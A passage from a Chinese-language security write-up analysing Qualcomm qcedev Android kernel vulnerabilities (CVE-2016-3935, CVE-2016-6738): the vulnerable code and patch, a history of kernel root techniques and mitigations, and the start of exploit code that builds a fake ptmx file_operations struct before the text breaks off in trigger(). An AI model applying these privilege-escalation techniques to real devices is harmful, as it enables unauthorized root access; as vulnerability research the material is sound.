                    break;
    ...
            return err;
    }
`qcedev_areq.sha_op_req.alg` 的值也是应用层控制的，当等于 `QCEDEV_ALG_AES_CMAC` 时，进入函数
`qcedev_hash_cmac`
     868 static int qcedev_hash_cmac(struct qcedev_async_req *qcedev_areq,
     869                                         struct qcedev_handle *handle,
     870                                         struct scatterlist *sg_src)
     871 {
     872         int err = 0;
     873         int i = 0;
     874         uint32_t total;
     875 
     876         uint8_t *user_src = NULL;
     877         uint8_t *k_src = NULL;
     878         uint8_t *k_buf_src = NULL;
     879 
     880         total = qcedev_areq->sha_op_req.data_len;
     881 
     882         /* verify address src(s) */
     883         for (i = 0; i sha_op_req.entries; i++)
     884                 if (!access_ok(VERIFY_READ,
     885                         (void __user *)qcedev_areq->sha_op_req.data[i].vaddr,
     886                         qcedev_areq->sha_op_req.data[i].len))
     887                         return -EFAULT;
     888 
     889         /* Verify Source Address */
     890         if (!access_ok(VERIFY_READ,
     891                                 (void __user *)qcedev_areq->sha_op_req.authkey,
     892                                 qcedev_areq->sha_op_req.authklen))
     893                         return -EFAULT;
     894         if (__copy_from_user(&handle->sha_ctxt.authkey[0],
     895                                 (void __user *)qcedev_areq->sha_op_req.authkey,
     896                                 qcedev_areq->sha_op_req.authklen))
     897                 return -EFAULT;
     898 
     899 
     900         k_buf_src = kmalloc(total, GFP_KERNEL);
     901         if (k_buf_src == NULL) {
     902                 pr_err("%s: Can't Allocate memory: k_buf_src 0x%lx\n",
     903                                 __func__, (uintptr_t)k_buf_src);
     904                 return -ENOMEM;
     905         }
     906 
     907         k_src = k_buf_src;
     908 
     909         /* Copy data from user src(s) */
     910         user_src = (void __user *)qcedev_areq->sha_op_req.data[0].vaddr;
     911         for (i = 0; i sha_op_req.entries; i++) {
     912                 user_src =
     913                         (void __user *)qcedev_areq->sha_op_req.data[i].vaddr;
     914                 if (user_src && __copy_from_user(k_src, (void __user *)user_src,
     915                                 qcedev_areq->sha_op_req.data[i].len)) {
     916                         kzfree(k_buf_src);
     917                         return -EFAULT;
     918                 }
     919                 k_src += qcedev_areq->sha_op_req.data[i].len;
     920         }
    ...
    }
在函数 `qcedev_hash_cmac` 里， line 900 申请的堆内存 `k_buf_src` 的长度是
`qcedev_areq->sha_op_req.data_len` ，即请求数组里所有项的长度之和
然后在 line 911 ~ 920 的循环里，会将请求数组 `qcedev_areq->sha_op_req.data[]` 里的元素挨个拷贝到堆
`k_buf_src` 里，由于前面存在的整数溢出漏洞，这里会转变成为一个堆溢出漏洞，至此漏洞坐实。
##### CVE-2016-3935 漏洞补丁
这个
[漏洞补丁](https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=5f69ccf3b011c1d14a1b1b00dbaacf74307c9132)
也很直观，就是在做整数溢出时，将 ULONG_MAX 改成了 U32_MAX, 这种因为系统由32位升级到64位导致的代码漏洞，是 2016
年的一类常见漏洞
下面进入漏洞利用分析
#### 漏洞利用
##### android kernel 漏洞利用基础
在介绍本文两个漏洞的利用之前，先回顾一下 android kernel 漏洞利用的基础知识
##### 什么是提权
    include/linux/sched.h
    struct task_struct {
            volatile long state;    /* -1 unrunnable, 0 runnable, >0 stopped */
            void *stack;
    ...
    /* process credentials */
            const struct cred __rcu *real_cred; /* objective and real subjective task
                                             * credentials (COW) */
            const struct cred __rcu *cred;  /* effective (overridable) subjective task
                                             * credentials (COW) */
            char comm[TASK_COMM_LEN]; /* executable name excluding path
                                         - access with [gs]et_task_comm (which lock
                                           it with task_lock())
                                         - initialized normally by setup_new_exec */
    ...
    }
linux kernel 里，进程由 `struct task_struct` 表示，进程的权限由该结构体的两个成员 real_cred 和 cred 表示
    include/linux/cred.h
    struct cred {
            atomic_t        usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
            atomic_t        subscribers;    /* number of processes subscribed */
            void            *put_addr;
            unsigned        magic;
    #define CRED_MAGIC      0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
            kuid_t          uid;            /* real UID of the task */
            kgid_t          gid;            /* real GID of the task */
            kuid_t          suid;           /* saved UID of the task */
            kgid_t          sgid;           /* saved GID of the task */
            kuid_t          euid;           /* effective UID of the task */
            kgid_t          egid;           /* effective GID of the task */
            kuid_t          fsuid;          /* UID for VFS ops */
            kgid_t          fsgid;          /* GID for VFS ops */
    ...
    }
所谓提权，就是修改进程的 real_cred/cred 这两个结构体的各种 id
值，随着缓解措施的不断演进，完整的提权过程还需要修改其他一些内核变量的值，但是最基础的提权还是修改本进程的 cred, 这个任务又可以分解为多个问题：
  * 怎么找到目标 cred ?
  * cred 所在内存页面是否可写？
  * 如何利用漏洞往 cred 所在地址写值？
##### 利用方法回顾
[图片来源](http://powerofcommunity.net/poc2016/x82.pdf)
上图是最近若干年围绕 android kernel 漏洞利用和缓解的简单回顾，
  * 09 ~ 10 年的时候，由于没有对 mmap 的地址范围做任何限制，应用层可以映射0页面，null pointer deref 漏洞在当时也是可以做利用的，后面针对这种漏洞推出了 `mmap_min_addr` 限制，目前 null pointer deref 漏洞一般只能造成 dos.
  * 11 ~ 13 年的时候，常用的提权套路是从 /proc/kallsyms 搜索符号 commit_creds 和 prepare_kernel_cred 的地址，然后在用户态通过这两个符号构造一个提权函数(如下)，
    shellcode:
    static void
    obtain_root_privilege_by_commit_creds(void)
    {
          commit_creds(prepare_kernel_cred(0));
    }
可以看到，这个阶段的用户态 shellcode 非常简单, 利用漏洞改写内核某个函数指针(最常见的就是 ptmx 驱动的 fsync
函数)将其实现替换为用户态的函数, 最后在用户态调用被改写的函数, 这样的话从内核直接执行用户态的提权函数完成提权
这种方法在开源root套件 [android_run_root_shell](https://github.com/android-rooting-tools/android_run_root_shell) 得到了充分体现
后来，内核推出了 kptr_restrict/dmesg_restrict 措施使得默认配置下无法从 /proc/kallsyms 等接口搜索内核符号的地址
但是这种缓解措施很容易绕过, android_run_root_shell 里提供了两种方法:
  1. 通过一些内存 pattern 直接在内存空间里搜索符号地址，从而得到 `commit_creds/prepare_kernel_cred` 的值; [libkallsyms:get_kallsyms_in_memory_addresses](https://github.com/android-rooting-tools/libkallsyms/blob/aa38ae78145724a2a330c1bab620cf3df7c3f6ad/kallsyms_in_memory.c)
  2. 放弃使用 `commit_creds/prepare_kernel_cred` 这两个内核函数，从内核里直接定位到 task_struct 和 cred 结构并改写 [obtain_root_privilege_by_modify_task_cred](https://github.com/android-rooting-tools/android_run_root_shell/blob/master/main.c)
2013 推出 text RO 和 PXN 等措施，通过漏洞改写内核代码段或者直接跳转到用户态执行用户态函数的提权方式失效了,
android_run_root_shell 这个项目里的方法大部分已经失效, 在 PXN 时代，主要的提权思路是使用rop
具体的 rop 技巧有几种，
下面两篇文章讲了基本的 linux kernel ROP 技巧
[Linux Kernel ROP - Ropping your way to # (Part
1)/)](https://www.trustwave.com/404/)  
[Linux Kernel ROP - Ropping your way to # (Part
2)/)](https://www.trustwave.com/404/)
可以看到这两篇文章的方法是搜索一些 rop 指令 ，然后用它们串联 commit_creds/prepare_kernel_cred,
是对上一阶段思路的自然延伸。
  1. 使用 rop 改写 addr_limit 的值，破除本进程的系统调用 access_ok 校验，然后通过一些函数如 [ptrace_write_value_at_address](https://github.com/hagurekamome/RootkitApp/blob/master/jni/getroot.c) 直接读写内核来提权, 将 `selinux_enforcing` 变量写 0 关闭 selinux
  2. 大名鼎鼎的 [Ret2dir](https://www.blackhat.com/docs/eu-14/materials/eu-14-Kemerlis-Ret2dir-Deconstructing-Kernel-Isolation.pdf) bypass PXN
  3. 还有就是本文使用的思路，用漏洞重定向内核驱动的 `xxx_operations` 结构体指针到应用层，再用 rop 地址填充应用层的伪 `xxx_operations` 里的函数实现
  4. 还有一些 2017 新出来的绕过缓解措施的技巧，[参考](http://powerofcommunity.net/poc2016/x82.pdf)
进入2017年，更多的漏洞缓解措施正在被开发和引进，谷歌的nick正在主导开发的项目
[Kernel_Self_Protection_Project](https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work)
对内核漏洞提权方法进行了分类整理，如下
  * [Kernel location](https://kernsec.org/wiki/index.php/Exploit_Methods/Kernel_location)
  * [Text overwrite](https://kernsec.org/wiki/index.php/Exploit_Methods/Text_overwrite)
  * [Function pointer overwrite](https://kernsec.org/wiki/index.php/Exploit_Methods/Function_pointer_overwrite)
  * [Userspace execution](https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_execution)
  * [Userspace data usage](https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_data_usage)
  * [Reused code chunks](https://kernsec.org/wiki/index.php/Exploit_Methods/Reused_code_chunks)
针对以上提权方法，[Kernel_Self_Protection_Project](https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work)
开发了对应的一系列缓解措施，目前这些措施正在逐步推入linux kernel
主线，下面是其中一部分缓解方案，可以看到，我们回顾的所有利用方法都已经被考虑在内，不久的将来，这些方法可能都会失效
  * Split thread_info off of kernel stack (Done: x86, arm64, s390. Needed on arm, powerpc and others?) 
  * Move kernel stack to vmap area (Done: x86, s390. Needed on arm, arm64, powerpc and others?)
  * Implement kernel relocation and KASLR for ARM
  * Write a plugin to clear struct padding
  * Write a plugin to do format string warnings correctly (gcc’s -Wformat-security is bad about const strings)
  * Make CONFIG_STRICT_KERNEL_RWX and CONFIG_STRICT_MODULE_RWX mandatory (done for arm64 and x86, other archs still need it)
  * Convert remaining BPF JITs to eBPF JIT (with blinding) (In progress: arm)
  * Write lib/test_bpf.c tests for eBPF constant blinding
  * Further restriction of perf_event_open (e.g. perf_event_paranoid=3)
  * Extend HARDENED_USERCOPY to use slab whitelisting (in progress)
  * Extend HARDENED_USERCOPY to split user-facing malloc()s and in-kernel malloc()svmalloc stack guard pages (in progress)
  * protect ARM vector table as fixed-location kernel target
  * disable kuser helpers on arm
  * rename CONFIG_DEBUG_LIST better and default=y
  * add WARN path for page-spanning usercopy checks (instead of the separate CONFIG)
  * create UNEXPECTED(), like BUG() but without the lock-busting, etc
  * create defconfig “make” target for by-default hardened Kconfigs (using guidelines below)
  * provide mechanism to check for ro_after_init memory areas, and reject structures not marked ro_after_init in vmbus_register()
  * expand use of __ro_after_init, especially in arch/arm64
  * Add stack-frame walking to usercopy implementations (Done: x86. In progress: arm64. Needed on arm, others?)
  * restrict autoloading of kernel modules (like GRKERNSEC_MODHARDEN) (In progress: Timgad LSM)
有兴趣的同学可以进入该项目看看代码，提前了解一下缓解措施，
比如 KASLR for ARM, 将大部分内核对象的地址做了随机化处理，这是以后 android kernel exploit 必须面对的;
另外比如 `__ro_after_init` ，内核启动完成初始化之后大部分 fops 全局变量都变成 readonly 的，这造成了本文这种利用方法失效,
所幸的是，目前 android kernel 还是可以用的。
##### 本文使用的利用方法
对照
[Kernel_Self_Protection_Project](https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work)
的利用分类，本文的利用思路属于 [Userspace data usage
](https://kernsec.org/wiki/index.php/Exploit_Methods/Userspace_data_usage)
> Sometimes an attacker won’t be able to control the instruction pointer
> directly, but they will be able to redirect the dereference a structure or
> other pointer. In these cases, it is easiest to aim at malicious structures
> that have been built in userspace to perform the exploitation.
具体来说，我们在应用层构造一个伪 `file_operations` 结构体(其他如 `tty_operations`
也可以)，然后通过漏洞改写内核某一个驱动的 fops 指针，将其改指向我们在应用层伪造的结构体，之后，我们搜索特定的 rop 并随时替换这个伪
`file_operations` 结构体里的函数实现，就可以做到在内核多次执行任意代码（取决于rop) ，这种方法的好处包括：
  1. 内核有很多驱动，所以 fops 非常多，地址上也比较分散，对一些溢出类漏洞来说，选择比较多
  2. 内核的 fops 一般都存放在 writable 的 data 区，至少目前android 主流 kernel 依然如此
  3. 将内核的 fops 指向用户空间后，用户空间可以随意改写其内部函数的实现
  4. 只需要一次内核写
下面结合漏洞说明怎么利用
##### CVE-2016-6738 漏洞利用
CVE-2016-6738 是一个任意地址写任意值的漏洞，利用代码已经提交在 [EXP-CVE-2016-6738](https://github.com/453483289/android_vuln_poc-exp/tree/master/EXP-CVE-2016-6738)
我们选择重定向 /dev/ptmx 设备的 file_operations, 先在用户态构造一个伪结构，如下
            map = mmap(0x1000000, (size_t)0x10000, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, -1, (off_t)0);
            if(map == MAP_FAILED) {
                    printf("[-] Failed to mmap landing (%d-%s)\n", errno, strerror(errno));
                    ret = -1;
                    goto out;
            }
            //printf("[+] landing mmap'ed @ %p\n", map);
            memset(map, 0x0, 0x10000);
            fake_ptmx_fops = map;
            printf("[+] fake_ptmx_fops = 0x%lx\n",fake_ptmx_fops);
            *(unsigned long*)(fake_ptmx_fops + 1 * 8) = PTMX_LLSEEK;
            *(unsigned long*)(fake_ptmx_fops + 2 * 8) = PTMX_READ;
            *(unsigned long*)(fake_ptmx_fops + 3 * 8) = PTMX_WRITE;
            *(unsigned long*)(fake_ptmx_fops + 8 * 8) = PTMX_POLL;
            *(unsigned long*)(fake_ptmx_fops + 9 * 8) = PTMX_IOCTL;
            *(unsigned long*)(fake_ptmx_fops + 10 * 8) = COMPAT_PTMX_IOCTL;
            *(unsigned long*)(fake_ptmx_fops + 12 * 8) = PTMX_OPEN;
            *(unsigned long*)(fake_ptmx_fops + 14 * 8) = PTMX_RELEASE;
            *(unsigned long*)(fake_ptmx_fops + 17 * 8) = PTMX_FASYNC;
根据前面的分析，伪结构的值需要先做一次加密，再使用
        unsigned long edata = 0;
            qcedev_encrypt(fd, fake_ptmx_fops, &edata);
            trigger(fd, edata);
下面是核心的函数
    static int trigger(int fd, unsigned long src)
    {
            int cmd;